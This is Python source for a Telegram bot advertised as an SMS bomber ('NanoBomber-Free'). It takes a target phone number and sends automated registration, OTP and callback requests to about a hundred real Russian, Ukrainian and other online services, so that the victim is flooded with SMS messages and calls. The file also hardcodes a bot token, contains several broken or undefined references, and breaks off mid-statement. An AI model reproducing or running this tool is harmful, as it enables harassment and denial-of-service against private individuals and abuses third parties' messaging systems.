import requests
from threading import Thread
from datetime import datetime, timedelta
from telebot import TeleBot
import telebot
import time
import random 
import json

TOKEN = '1057445759:AAGRiiRYSZrWyj-9jZdi1vx8SYPPlJ6WRe8'

THREADS_LIMIT = 10000

chat_ids_file = 'chat_ids.txt'

ADMIN_CHAT_ID = 978360788

users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
types = telebot.types
bot = TeleBot(TOKEN)
running_spams_per_chat_id = []

print('Bot has started! You can use him.')

def save_chat_id(chat_id):
    "Функция добавляет чат айди в файл если его там нету"
    chat_id = str(chat_id)
    with open(chat_ids_file,"a+") as ids_file:
        ids_file.seek(0)

        ids_list = [line.split('\n')[0] for line in ids_file]

        if chat_id not in ids_list:
            ids_file.write(f'{chat_id}\n')
            ids_list.append(chat_id)
            print(f'New chat_id saved: {chat_id}')
        else:
            print(f'chat_id {chat_id} is already saved')
        users_amount[0] = len(ids_list)
    return


def send_message_users(message):

    def send_message(chat_id):
        data = {
            'chat_id': chat_id,
            'text': message
        }
        response = requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMessage', data=data)

    with open(chat_ids_file, "r") as ids_file:
        ids_list = [line.split('\n')[0] for line in ids_file]

    [send_message(chat_id) for chat_id in ids_list]
    bot.send_message(ADMIN_CHAT_ID, f"сообщение успешно отправлено всем ({users_amount[0]}) пользователям бота!")


@bot.message_handler(commands=['start'])
def start(message):
    keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    boom = types.KeyboardButton(text='SMS-Бомбер 📨')
    stop = types.KeyboardButton(text='STOP Bomber ❌')
    info = types.KeyboardButton(text='🤖Информация')
    stats = types.KeyboardButton(text='📈Статистика')
    faq = types.KeyboardButton(text='FAQ')

    buttons_to_add = [boom, stop, info, stats, faq]

    keyboard.add(*buttons_to_add)
    bot.send_message(message.chat.id, 'Добро пожаловать, в NanoBomber-Free!\nНаш канал: @nanobomber\nВыберите действие:',  reply_markup=keyboard)
    save_chat_id(message.chat.id)

iteration = 0
_name = ''
for x in range(12):
    _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

def send_for_number(phone):

        request_timeout = 0.00001
        _email = _name+f'{iteration}'+'@gmail.com'
        email = _name+f'{iteration}'+'@gmail.com'
        _phone='380506691610'
        _phoneNEW=phone[3:]
        _phone = phone
        _phone9 = _phone[1:]
        _phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7+(915)350-99-08
        _phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10] #915+350-99-08
        _phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7+(915)350-99-08'
        _phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11] # '+7 (915) 350 99 08'
        _phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '915) 350-99-08'
        _phonePozichka = '+'+_phone[0:2]+'-'+_phone[2:5]+'-'+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12] #38-050-669-16-10'
        _phoneQ = '+'+_phone[0:2]+'('+_phone[2:5]+') '+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12] # +38(050) 669 16 10
        _phoneCitrus = '+'+_phone[0:3]+' '+_phone[3:5]+'-'+_phone[5:8]+' '+_phone[8:10]+' '+_phone[10:12]
        _phoneComfy = '+'+_phone[0:2]+' ('+_phone[2:5]+') '+_phone[5:8]+'-'+_phone[8:10]+'-'+_phone[10:12]
        _phone88 = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+'-'+_phone[9:11]
        _phone585 = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] #+7 (925) 350-99-08
        
        try:
            requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
            print('[+] RuTaxi sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password})
            print("[+] Регестрация на Citrus отправлена!")
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus})
            print("[+] Citrus отправлено!")
        except:
            print("[-] не отправлено!")

        try:
            requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
            json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"})
        except:
            pass

        try:
            requests.post("https://www.moyo.ua/identity/registration",
            data={
                "firstname": "Артем",
                "phone": _phone,
                "email": _email
            }
        )
        except:
            pass

        try:
            requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail})
        except:
            pass

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print('[+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!') 

        try:
            requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut})
            print('[+] Cinema5 отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://www.etm.ru/cat/runprog.html",
            data={
                "m_phone": _phone,
                "mode": "sendSms",
                "syf_prog": "clients-services",
                "getSysParam": "yes",
            },
        )
            print('[+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://apteka.ru/_action/auth/getForm/",
            data={
                "form[NAME]": "",
                "form[PERSONAL_GENDER]": "",
                "form[PERSONAL_BIRTHDAY]": "",
                "form[EMAIL]": "",
                "form[LOGIN]": _phone585,
                "form[PASSWORD]": password,
                "get-new-password": "Получите пароль по SMS",
                "user_agreement": "on",
                "personal_data_agreement": "on",
                "formType": "simple",
                "utc_offset": "120",
            },
        )
            print('[+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
        except:
            pass

        try:
            requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone})
            print('[+] Secunda отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,})
            print('[+] rozamira-azs отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",
            params={"msisdn": _phone})
        except:
            pass

        try:
            requests.get("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code",
            params={"number": _phone})
        except:
            pass

        try:
            requests.post("https://api.iconjob.co/api/auth/verification_code",
            json={"phone": _phone})
        except:
            pass

        try:
            requests.post("https://panda99.ru/bdhandlers/order.php?t={int(time())}",
            data={
                "CB_NAME": "Артем",
                "CB_PHONE": _phone88})
        except:
            pass

        try:
            requests.post("https://auth.pizza33.ua/ua/join/check/",
            params={
                "callback": "angular.callbacks._1",
                "email": _email,
                "password": password,
                "phone": _phone,
                "utm_current_visit_started": 0,
                "utm_first_visit": 0,
                "utm_previous_visit": 0,
                "utm_times_visited": 0,
            },
        )
        except:
            pass

        try:
            requests.post( "https://shop.vsk.ru/ajax/auth/postSms/", data={"phone": _phone})
        except:
            pass

        try:
            requests.post("https://zoloto585.ru/api/bcard/reg/",
            json={
                "name": "Максим",
                "surname": "Летовал",
                "patronymic": "Максимович",
                "sex": "m",
                "birthdate": "11.11.1999",
                "phone": _phone585,
                "email": email,
                "city": "Москва",
            },
        )
            print('[+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://pliskov.ru/Cube.MoneyRent.Orchard.RentRequest/PhoneConfirmation/SendCode",
            data={"phone": _phone585},
        )
            print('[+] Pliskov отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
            print('[+] FoxTrot отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!') 

        try:
            requests.post("https://taxi-ritm.ru/ajax/ppp/ppp_back_call.php?URL=/",
            data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
        except:
            pass

        try:
            requests.post("https://www.sms4b.ru/bitrix/components/sms4b/sms.demo/ajax.php",
            data={"demo_number": "+" + _phone, "ajax_demo_send": "1"},
        )
            print('[+] Sms4 отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/5/user/otp/generate",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            data={"loginId": "+" + _phone})
            print('[+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://www.flipkart.com/api/6/user/signup/status",
            headers={
                "Origin": "https://www.flipkart.com",
                "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop",
            },
            json={"loginId": "+" + _phone, "supportAllStates": True})
            print('[+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://bamper.by/registration/?step=1",
            data={
                "phone": "+" + _phone,
                "submit": "Запросить смс подтверждения",
                "rules": "on",
            },
        )
            print('[+] Bamper отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://friendsclub.ru/assets/components/pl/connector.php",
            data={"casePar": "authSendsms", "MobilePhone": "+" + _phone})
            print('[+] FriendClub отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://app.salampay.com/api/system/sms/c549d0c2-ee78-4a98-659d-08d682a42b29",
            data={"caller_number": _phone})
            print('[+] SalamPay отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "call",
            })
            print('[+] звонок отправлен!')
            time.sleep(0.1)
        except:
            print('[+] не отправлен!')

        try:
            requests.post("https://app.doma.uchi.ru/api/v1/parent/signup_start",
            json={
                "phone": "+" + _phone,
                "first_name": "-",
                "utm_data": {},
                "via": "sms",
            },
        )
            print('[+] Uchi отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data={ "msisdn": _phone, "locale": "en", "countryCode": "ru", "version": "1", "k": "ic1rtwz1s1Hj1O0r", "r": "46763", })
            print('[+] ICQ отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://shafa.ua/api/v3/graphiql', json={
                "operationName": "RegistrationSendSms",
                "variables": {"phoneNumber": "+" + _phone},
                "query": "mutation RegistrationSendSms($phoneNumber: String!) {\n  unauthorizedSendSms(phoneNumber: $phoneNumber) {\n    isSuccess\n    userToken\n    errors {\n      field\n      messages {\n        message\n        code\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n",
            },
        )
            print('[+] Shafa отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://alpari.com/api/en/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
            headers={"Referer": "https://alpari.com/en/registration/"},
            json={
                "client_type": "personal",
                "email": _email,
                "mobile_phone": _phone,
                "deliveryOption": "sms",
            },
        )
            print('[+] Alpari отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send',
            headers={"client_id": "6289de851fc726f887af8d5d7a56c635"},
            json={"phone": _phone},
            )
            print('[+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print('[-] е отправлено!')

        try:
            requests.post('https://crm.getmancar.com.ua/api/veryfyaccount', json={ "phone": "+" + _phone, "grant_type": "password", "client_id": "gcarAppMob", "client_secret": "SomeRandomCharsAndNumbersMobile"})
            print('[+] GetMancar отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://auth.multiplex.ua/login', json={'login': _phone})
            print('[+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://lk.invitro.ru/sp/mobileApi/createUserByPassword', data={"password": password,"application": "lkp","login": "+" + _phone})
            print('[+] Invitro отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {"auth": { "mphone": "+" + _phone,"bdate": "11.11.1999","deviceid": "00100", "version": "1.0","source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json"})
            print('[+] Ubki отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut})
            print('[+] Top-Shop отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.rendez-vous.ru/ajax/SendPhoneConfirmationNew/',  data={"phone": _phonePizzahut, "alien": "0"})
            print('[+] Rendez-Vous отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://osava.ua/users/sign-up/callbacks', data={"phone_callbacks": _phone, "send_callbacks": "Отправить"})
            print('[+] Osova отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправено!')

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
            json={"phone_number": "+" + _phone})
            
            print('[+] Yandex.Eda отправлено!')
            time.leep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/register",
            json={
                "phone": "+" + _phone,
                "name": "Анастасия",
                "is_terms_accepted": True,
            },
        )
            print('[+] Izi отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone})
            print('[+] Izzi отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://api.pozichka.ua/v1/registration/send', json={"RegisterSendForm": {"phone": _phonePozichka}})
            print('[+] Pozichka отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
         
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country":"UA","phone": phone[3:]}) 
            print('[+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:     
            print('[-] не отправлено!')
        
        try:
            requests.post('https://suandshi.ru/mobile_api/register_mobile_user', params={"phone": _phone})
            print('[+] Suandshi отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php', data={"data": _phone, "metod": "postreg"})
            print('[+] Makarolls отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode', data={"telephone": "8" + _phone[1:]})
            print('[+] PanPizza отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post("https://www.moyo.ua/identity/registration", data={"firstname": "Артем", "phone": _phone,"email": email})
            print('[+] MOYO отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={}, proxies=proxies)
            print('[+] BelkaCar sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone})
            print('[+] StarPizzaCafe отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print('[+] Tinder sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
            print('[+] Karusel sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
            print('[+] Tinkoff отправлено!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')
            
        try:
            requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
            print('[+] Dostavista отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
            print('[+] MonoBank отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post(f'https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone}', data={"result":"ok"})
            print('[+] SportMaster отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
         
        try:
            requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
            print('[+] Alfalife отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
            
        try:
            requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
            print('[+] KoronaPay отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://btfair.site/api/user/phone/code', json={"phone": "+" + _phone,})
            print('[+] BTfair отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://ggbet.ru/api/auth/register-with-phone', data={"phone": "+" + _phone, "login": _email, "password": password, "agreement": "on", "oferta": "on",})
            print('[+] GGbet отправлено!')
            time.sleep(0.1)
        except:
            print('[-]  не отправлено!')
        
        try:
            requests.post('https://www.etm.ru/cat/runprog.html', data={"m_phone": _phone, "mode": "sendSms", "syf_prog": "clients-services", "getSysParam": "yes",})
            print('[+] ETM отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone,})
            print('[+] TheLive отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
             
        try:
            requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
            print('[+] MTS sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
            print('[+] MyGames sent!')
            time.sleep(0.1)
        except:
            print('[+] error in sent!')
        
        try:
            requests.post('https://zoloto585.ru/api/bcard/reg/', json={"name": _name,"surname": _name,"patronymic": _name,"sex": "m","birthdate": "11.11.1999","phone": (_phone, "+* (***) ***-**-**"),"email": _email,"city": "Москва",})
            print('[+] Zoloto585 отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://kasta.ua/api/v2/login/', data={"phone":_phone})
            print('[+] Kasta отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Kasta Не отправлено!')
            
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink', json={"phone":"+" + _phone, "api": 2,"email":"email", "x-email":"x-email",}, proxies={'http':'138.197.137.39:8080'})
            print('[+] Mail.ru отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://api.creditter.ru/confirm/sms/send', json={"phone": (_phone, "+* (***) ***-**-**"),"type": "register",})
            print('[+] Creditter отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://www.ingos.ru/api/v1/lk/auth/register/fast/step2', headers={"Referer": "https://www.ingos.ru/cabinet/registration/personal"}, json={"Birthday": "1986-07-10T07:19:56.276+02:00","DocIssueDate": "2004-02-05T07:19:56.276+02:00","DocNumber": randint(500000, 999999), "DocSeries": randint(5000, 9999),"FirstName": _name,"Gender": "M","LastName": _name,"SecondName": _name,"Phone": _phone,"Email": _email,})
            print('[+] Ingos отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://win.1admiralxxx.ru/api/en/register.json', json={"mobile": _phone,"bonus": "signup","agreement": 1,"currency": "RUB","submit": 1,"email": "","lang": "en",})
            print('[+] Admiralxxx отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
            print('[+] Av отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code', params={"msisdn": _phone})
            print('[+] MTS отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
            
        try:
            requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
            print('[+] City24 отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
            print('[+] SushiMaster отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
            print('[+] MultiPlex отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
            
        try:
            requests.post('https://www.niyama.ru/ajax/sendSMS.php', data={"REGISTER[PERSONAL_PHONE]": _phone,"code":"", "sendsms":"Выслать код",})
            print('[+] Niyama отправлено!')
            time.sleep(0.1)
        except:
            print('[-] Niyama не отправлено!')
        
        try:
            requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
            print('[+] VSK отправлено!')
            time.sleep(0.1)
        except:
            print('[-] VSK не отправлено!')

        try:
            requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
            print('[+] EasyPay отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://fix-price.ru/ajax/register_phone_code.php', data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
            print('[+] Fix-Price отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
            
        try:
            requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login","sessid": "bf70db951f54b837748f69b75a61deb4","method": "sendCode", "phone": _phone,"registration": "N",})
            print('[+] NovaLinia отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
            
        try:
            requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
            print('[+] Tele2 отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
            print('[+] Finam отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://makimaki.ru/system/callback.php', params={"cb_fio": _name,"cb_phone": format(_phone, "+* *** *** ** **")})
            print('[+] MakiMaki отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://www.flipkart.com/api/6/user/signup/status', headers={"Origin": "https://www.flipkart.com", "X-user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0FKUA/website/41/website/Desktop",}, json={"loginId": "+" + _phone, "supportAllStates": True})
            print('[+] FlipKart отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
            print('[+] Online.ua отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
            print('[+] PlanetaKino отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://ontaxi.com.ua/api/v2/web/client', json={"country": _codes[_code].upper(), "phone": _phone,})
            print('[+] OnTaxi отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
                
        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
            print('[+] Iqos отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
            
        try:
            requests.post('https://smart.space/api/users/request_confirmation_code/', json={"mobile": "+" + _phone, "action": "confirm_mobile"})
            print('[+] Smart.Space отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
            print('[+] KFC отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
       
        try:
            requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', data={'action': 'ajax_register_user', 'step': '1', 'security_login': '50a8c243f6', 'phone': _phone})
            print('[+] tarantino-family отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://apteka.ru/_action/auth/getForm/', data={"form[NAME]": "","form[PERSONAL_GENDER]": "", "form[PERSONAL_BIRTHDAY]": "", "form[EMAIL]": "","form[LOGIN]": (_phone, "+* (***) ***-**-**"),"form[PASSWORD]": password,"get-new-password": "Получите пароль по SMS","user_agreement": "on","personal_data_agreement": "on","formType": "simple", "utc_offset": "120",})
            print('[+] Apteka отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://uklon.com.ua/api/v1/account/code/send', headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
            print('[+] Uklon отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.ozon.ru/api/composer-api.bx/_action/fastEntry', json={"phone": _phone, "otpId": 0})
            print('[+] Ozon отправлен!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.get('https://requests.service.banki.ru/form/960/submit', params={"callback": "submitCallback","name": _name,"phone": "+" + _phone,"email": _email,"gorod": "Москва","approving_data": "1",})
            print('[+] Banki отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
        
        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
            print('[+] IVI отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.moyo.ua/identity/registration', data={"firstname": _name, "phone": _phone,"email":_email})
            print('[+] Moyo отправлено!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')
       
        try:
            requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
            print('[+] Helsi отправлено!')
            time.sleep(0.1)
        except:
            print('[+] не отправлено!')    
        
        try:
            requests.post('https://api.kinoland.com.ua/api/v1/service/send-sms', headers={"Agent": "website"}, json={"Phone": _phone, "Type": 1})
            print('[+] KinoLend отправлен!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
            print('[+] PizzaHut sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
            print('[+] Rabota sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
            print('[+] Rutube sent!')
            time.sleep(0.1)
        except:
            print('[-] Rutube in sent!')
     
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
            print('[+] Citilink sent!')
            time.sleep(0.1)
        except:
            print('[-] не отправлено!')

        try:
            requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
            print('[+] Smsint sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
            print('[+] oyorooms sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode', params={"pageName":"registerPrivateUserPhoneVerificatio"}, data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "",})
            print('[+] MVIDEO sent!')
            time.sleep(0.1)
        except:
            print('[-] error in sent!')

        try:
            requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
            print('[+] newnext sent!')
